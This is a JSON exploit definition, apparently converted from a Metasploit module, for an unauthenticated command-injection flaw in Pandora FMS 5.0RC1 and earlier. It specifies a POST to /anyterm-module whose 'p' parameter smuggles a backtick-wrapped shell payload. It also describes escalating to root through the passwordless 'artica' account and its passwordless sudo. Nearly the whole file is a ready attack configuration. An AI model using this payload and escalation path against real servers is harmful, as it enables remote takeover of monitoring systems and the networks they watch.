{
   "msf_module" : "pandora_fms_exec",
   "name" : "PandoraFmsExec",
   "paths" : [
      ""
   ],
   "detection" : {},
   "informations" : {
      "METHOD" : "POST",
      "TYPE" : "MSF",
      "PLATFORM" : "ALL",
      "PATHS" : [
         ""
      ],
      "MSF_MODULE" : "pandora_fms_exec",
      "VARIABLES" : {
         "PATH" : {
            "DESCRIPTION" : "The base path to the Pandora instance",
            "VALUE" : "/"
         }
      },
      "REQUESTS" : {
         "EXPLOIT2" : {
            "PATH" : "anyterm-module",
            "METHOD" : "POST",
            "PAYLOAD" : "a=open&p=%60__PAYLOAD__%60",
            "HEADERS" : {
               "Content-Type" : "application/x-www-form-urlencoded"
            },
            "TEXT" : "Sending Exploit #2 Request : [POST] /anyterm-module",
            "VALIDATION" : {
               "TCODE" : [
                  "200"
               ]
            }
         }
      },
      "name" : "PandoraFmsExec",
      "PAYLOAD" : "a=open&p=`__PAYLOAD\\.ENCODED__`&",
      "DESCRIPTION" : "\n\n        This module exploits a vulnerability found in Pandora FMS 5.0RC1 and lower.\n\n        It will leverage an unauthenticated command injection in the Anyterm service on\n\n        port 8023/TCP. Commands are executed as the user \"pandora\". In Pandora FMS 4.1 and 5.0RC1\n\n        the user \"artica\" is not assigned a password by default, which makes it possible to su\n\n        to this user from the \"pandora\" user. The \"artica\" user has access to sudo without a\n\n        password, which makes it possible to escalate privileges to root. However, Pandora FMS 4.0\n\n        and lower force a password for the \"artica\" user during installation.\n\n      "
   },
   "requests" : {
      "EXPLOIT2" : {
         "PATH" : "anyterm-module",
         "METHOD" : "POST",
         "PAYLOAD" : "a=open&p=%60__PAYLOAD__%60",
         "HEADERS" : {
            "Content-Type" : "application/x-www-form-urlencoded"
         },
         "TEXT" : "Sending Exploit #2 Request : [POST] /anyterm-module",
         "VALIDATION" : {
            "TCODE" : [
               "200"
            ]
         }
      }
   },
   "plugins_directory" : "/home/evil/GIT/Exploits/../data/plugins/",
   "description" : "\n\n        This module exploits a vulnerability found in Pandora FMS 5.0RC1 and lower.\n\n        It will leverage an unauthenticated command injection in the Anyterm service on\n\n        port 8023/TCP. Commands are executed as the user \"pandora\". In Pandora FMS 4.1 and 5.0RC1\n\n        the user \"artica\" is not assigned a password by default, which makes it possible to su\n\n        to this user from the \"pandora\" user. The \"artica\" user has access to sudo without a\n\n        password, which makes it possible to escalate privileges to root. However, Pandora FMS 4.0\n\n        and lower force a password for the \"artica\" user during installation.\n\n      ",
   "method" : "POST",
   "type" : "MSF",
   "platform" : "ALL",
   "payload" : "a=open&p=`__PAYLOAD\\.ENCODED__`&",
   "variables" : {
      "PATH" : {
         "DESCRIPTION" : "The base path to the Pandora instance",
         "VALUE" : "/"
      }
   }
}
